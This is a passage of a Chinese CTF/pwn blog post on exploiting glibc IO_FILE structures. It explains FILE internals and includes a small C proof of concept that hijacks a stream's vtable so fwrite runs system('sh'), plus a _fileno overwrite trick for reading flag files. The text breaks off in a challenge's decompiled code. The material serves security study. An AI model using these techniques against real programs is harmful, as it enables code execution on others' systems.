<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2024/11/08/linux-io_file-exploit/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            linux IO_FILE 利用 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">linux IO_FILE 利用</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2024-11-08 03:07:36</span>
        <span class="mobile">2024-11-08 03:07:36</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2024-11-20 03:32:13</span>
            <span class="mobile">2024-11-20 03:32:13</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/pwn/">pwn</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/pwn/linux-user-pwn/">linux user pwn</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/linux-user-pwn/">linux user pwn</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>22.7k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>115 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h1><p>IO FILE 定义的各种主要结构关系如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/ea5063408b268d86b52ecebe0894e2b9.png"
                     
                ></p>
<ul>
<li><p>各种文件结构采用单链表的形式连接起来，通过 <code>_IO_list_all</code> 访问。</p>
</li>
<li><p><code>vatble</code> 为函数指针结构体，存放着各种 IO 相关的函数的指针。</p>
</li>
<li><p>初始情况下 <code>_IO_FILE</code> 结构有 <code>_IO_2_1_stderr_</code> ，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stdin_</code> 三个，通过 <code>_IO_list_all</code> 将这三个结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \</span></span><br><span class="line"><span class="meta">  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \</span></span><br><span class="line"><span class="meta">  static struct _IO_wide_data _IO_wide_data_##FD \</span></span><br><span class="line"><span class="meta">    = &#123; ._wide_vtable = &amp;_IO_wfile_jumps &#125;; \</span></span><br><span class="line"><span class="meta">  struct _IO_FILE_plus NAME \</span></span><br><span class="line"><span class="meta">    = &#123;FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \</span></span><br><span class="line"><span class="meta">       &amp;_IO_file_jumps&#125;</span></span><br><span class="line">       </span><br><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br><span class="line">libc_hidden_data_def (_IO_list_all)</span><br></pre></td></tr></table></figure></div>

<p>并且存在 3 个全局指针 <code>stdin</code>，<code>stdout</code>，<code>stderr</code> 分别指向  <code>_IO_2_1_stdin_</code>，<code>_IO_2_1_stdout_</code>，<code>_IO_2_1_stderr_</code> 三个结构体。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="built_in">stdin</span> = (FILE *) &amp;_IO_2_1_stdin_;</span><br><span class="line">FILE *<span class="built_in">stdout</span> = (FILE *) &amp;_IO_2_1_stdout_;</span><br><span class="line">FILE *<span class="built_in">stderr</span> = (FILE *) &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure></div>

<p>因此上述结构的关系如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/d2828352a7bf33e05ffd15edc47ac75f.png"
                     
                ></p>
</li>
<li><p>果有文件读写操作则会为对应文件创建一个 <code>_IO_FILE</code> 结构体，并且链接到 <code>_IO_list_all</code> 链表上。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_link_in (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1dee20e9043550b64dc1b3d0fe347f8c.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/aaaf2aef59974194e0c422c8173f20d3.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>缓冲区如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2fa5c22dfa9505ebfcd7cea0e06b1fab.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/cb0f0f01fc0497ec52772692b313d463.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ><br>缓冲区如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1763f1198512dc8f9468f862784f8dfa.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ></p>
<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>关键流程大致如下，具体看源码。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/93c639d6e1c30c3a6d70c3d94b653839.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="利用-fileno-字段泄露数据"><a href="#利用-fileno-字段泄露数据" class="headerlink" title="利用 _fileno 字段泄露数据"></a>利用 _fileno 字段泄露数据</h1><p><code>_fileno</code> 的值就是文件描述符，位于 stdin 文件结构开头 0x70 偏移处，比如： stderr 的 <code>fileno</code> 值为2，stdout 的 <code>fileno</code> 值为 1 。在漏洞利用中可以通过修改 <code>stdin</code> 的 <code>_fileno</code> 值来重定位需要读取的文件，本来为 0 的话表示从标准输入中读取，修改为 4 则表示为从文件描述符为 4 的文件中读取，这里利用这个点可以直接读取 flag 。</p>
<h1 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h1><p> <code>vtable</code> 劫持分为两种，一种是直接改写 <code>vtable</code> 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 <code>vtable</code> 的指针指向我们控制的内存，然后在其中布置函数指针。由于 <code>vtable</code> 一般都不可修改，所以第一种方式不太常见。<br><strong>注意： <code>vtable</code> 是否可写跟 libc 有关，而且有的高版本 libc 反而可写，比如下面这个 glibc-2.34。</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/f06cdc377965e91d972da30e477f6abd.png"
                     
                ><br>在 libc2.24 版本之前由于没有 <code>_IO_vtable_check</code> 检查 <code>vtable</code> 地址，因此可以通过伪造 <code>vtable</code> 来调用所需函数 。</p>
<p> IO 调用的 vtable 函数：</p>
<p><code>fopen</code> 函数是在分配空间，建立 <code>FILE</code> 结构体，未调用 <code>vtable</code> 中的函数。</p>
<p><code>fread</code> 函数中调用的 <code>vtable</code> 函数有：</p>
<ul>
<li><code>_IO_sgetn</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_xsgetn</code> 。</li>
<li><code>_IO_doallocbuf</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_doallocate</code> 以初始化输入缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_file_doallocate</code> 调用了 <code>vtable</code> 中的 <code>__GI__IO_file_stat</code> 以获取文件信息。</li>
<li><code>__underflow</code> 函数调用了 <code>vtable</code> 中的 <code>_IO_new_file_underflow</code> 实现文件数据读取。</li>
<li><code>vtable</code> 中的 <code>_IO_new_file_underflow</code> 调用了 <code>vtable__GI__IO_file_read</code> 最终去执行系统调用<code>read</code>。</li>
</ul>
<p><code>fwrite</code> 函数调用的 <code>vtable</code> 函数有：</p>
<ul>
<li><code>_IO_fwrite</code> 函数调用了 <code>vtable</code> 的 <code>_IO_new_file_xsputn</code> 。</li>
<li><code>_IO_new_file_xsputn</code> 函数调用了 <code>vtable</code> 中的 <code>_IO_new_file_overflow</code> 实现缓冲区的建立以及刷新缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_new_file_overflow</code> 函数调用了 <code>vtable</code> 的 <code>_IO_file_doallocate</code> 以初始化输入缓冲区。</li>
<li><code>vtable</code> 中的 <code>_IO_file_doallocate</code> 调用了 <code>vtable</code> 中的 <code>__GI__IO_file_stat</code> 以获取文件信息。</li>
<li><code>new_do_write</code> 中的 <code>_IO_SYSWRITE</code> 调用了 <code>vtable_IO_new_file_write</code> 最终去执行系统调用<code>write</code>。</li>
</ul>
<p><code>fclose</code> 函数调用的 <code>vtable</code> 函数有：</p>
<ul>
<li>在清空缓冲区的 <code>_IO_do_write</code> 函数中会调用 <code>vtable</code> 中的函数。</li>
<li>关闭文件描述符 <code>_IO_SYSCLOSE</code> 函数为 <code>vtable</code> 中的 <code>__close</code> 函数。</li>
<li><code>_IO_FINISH</code> 函数为 <code>vtable</code> 中的 <code>__finish</code> 函数。</li>
</ul>
<p>下面举一个实际的例子：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 *fake_vtable = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_vtable[<span class="number">7</span>] = (i64) &amp;system;</span><br><span class="line">    i64 *vtable_addr = (i64 *) ((i8 *) fp + <span class="number">0xD8</span>);</span><br><span class="line">    *vtable_addr = (i64) fake_vtable;</span><br><span class="line">    <span class="built_in">memcpy</span>(fp, <span class="string">&quot;sh&quot;</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">fwrite</span>(<span class="string">&quot;hi&quot;</span>, <span class="number">2</span>, <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>使用的 libc 版本如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al.</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 5.4.0 20160609.</span><br><span class="line">Available extensions:</span><br><span class="line">	crypt add-on version 2.1 by Michael Glad and others</span><br><span class="line">	GNU Libidn by Simon Josefsson</span><br><span class="line">	Native POSIX Threads Library by Ulrich Drepper et al</span><br><span class="line">	BIND-8.2.3-T5B</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>

<p>此版本 libc 没有 <code>_IO_vtable_check</code> 检查，因此可以随意伪造 <code>vtable</code> 。<br>在执行 <code>fwrite</code> 时会调用 <code>vtable</code> 中的 <code>_IO_new_file_xsputn</code> ，参数为对应的 <code>_IO_FILE_plus</code> ，因此在伪造的 <code>vtable</code> 对应位置上写入 <code>system</code> 地址，并在 <code>_IO_FILE_plus</code> 所在地址写入 <code>sh\x00</code> ，然后调用 <code>fwrite</code> 即可得到 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/31f2c653ca8ba5a889437b6e7522adc8.png"
                     
                ><br>例题：<a class="link"   target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/" >2018 HCTF the_end<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">close</span>(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span 